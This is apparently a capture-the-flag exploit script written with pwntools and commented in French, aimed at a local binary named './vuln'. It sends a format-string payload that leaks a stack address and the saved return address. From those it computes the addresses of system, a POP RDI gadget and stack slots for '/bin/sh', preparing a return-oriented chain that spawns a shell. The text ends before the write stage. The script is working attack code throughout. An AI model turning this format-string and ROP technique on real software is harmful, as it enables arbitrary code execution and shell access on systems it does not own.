#!/usr/bin/env python3
import re

from pwn import ELF, context, fmtstr_payload, log, process, u64

# =============================================================================
# CONFIGURATION
# =============================================================================
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# Nom du binaire 
binary_name = './vuln'
elf = ELF(binary_name, checksec=False)

# Pour lancer en local
p = process(binary_name)

# Adress code
OFFSET_GADGET = 0x70 # Par rapport à saved_rip
OFFSET_SYSTEM = 0x3F3 # Par rapport à saved_rip (négatif)
LSB_LOOP_BYTE = 0xEE # (LSB change de 0xF3 à 0xEE)

# Adress ecriture pile
OFFSET_TO_RIP   = 20 * 8 # Distance entre le leak %7$p et le Saved RIP (%27$p)
OFFSET_ARG_PTR  = 8       # Où on met l'adresse de la chaîne
OFFSET_FUNC     = 16      # Où on met l'adresse de system
OFFSET_STR_DATA = 24      # Où on écrit "/bin/sh" (Zone stable)

# =============================================================================
# ETAPE 1 : Leak des adresses
# =============================================================================
log.info("=== Etape 1 : Leak des adresses ===")

# On att de devoir rentrer le ping pour envoyer notre payload de format string
p.recvuntil(b"ping:")

# Envoi du payload de leak
playload_leak = b"%7$p %27$p" # On demande les valeurs aux offsets 7, 27 et 28
p.sendline(playload_leak)

# Réception et parsing des résultats
# On lit jusqu'a obtenir deux valeurs hexadecimales 0x...
hex_re = re.compile(r"0x[0-9a-fA-F]+")
leaks = []
response = ""
for _ in range(5):
	response = p.recvline().decode(errors="ignore").strip()
	leaks = hex_re.findall(response)
	if len(leaks) >= 2:
		break

if len(leaks) < 2:
	raise RuntimeError(f"Leak incomplet: '{response}'")

saved_rbp = int(leaks[0], 16) # Mot 7
saved_rip = int(leaks[1], 16) # Mot 27

log.success(f"Leaked Stack (RBP - Offset 7): {hex(saved_rbp)}")
log.success(f"Leaked Saved RIP (Offset 27): {hex(saved_rip)}")

# =============================================================================
# ETAPE 2 : Calcul des adresses cibles
# =============================================================================
log.info("=== Etape 2 : Calcul des adresses cibles ===")

# --- Cibles dans le CODE ---
target_gadget = saved_rip + OFFSET_GADGET
target_system = saved_rip - OFFSET_SYSTEM

# Adresse de boucle 
# On prend saved_rip, on met le dernier octet à 00, puis on ajoute 0xEE
target_loop   = (saved_rip & 0xFFFFFFFFFFFFFF00) | LSB_LOOP_BYTE

# --- Emplacements d'écriture sur la PILE ---
stack_addr_rip = saved_rbp + OFFSET_TO_RIP

write_loc_arg_ptr = stack_addr_rip + OFFSET_ARG_PTR 
write_loc_func    = stack_addr_rip + OFFSET_FUNC      
write_loc_binsh   = stack_addr_rip + OFFSET_STR_DATA


log.info(f"Target System (@PLT)    : {hex(target_system)}")
log.info(f"Target Gadget (POP RDI) : {hex(target_gadget)}")
log.info(f"Target Loop (LSB 0xEE)  : {hex(target_loop)}")

log.info("-" * 20)

log.info(f"Write Loc: Saved RIP    : {hex(stack_addr_rip)}")
log.info(f"Write Loc: Arg Pointer  : {hex(write_loc_arg_ptr)}")
log.info(f"Write Loc: Function     : {hex(write_loc_func)}")
log.info(f"Write Loc: Str Storage  : {hex(write_loc_binsh)}")

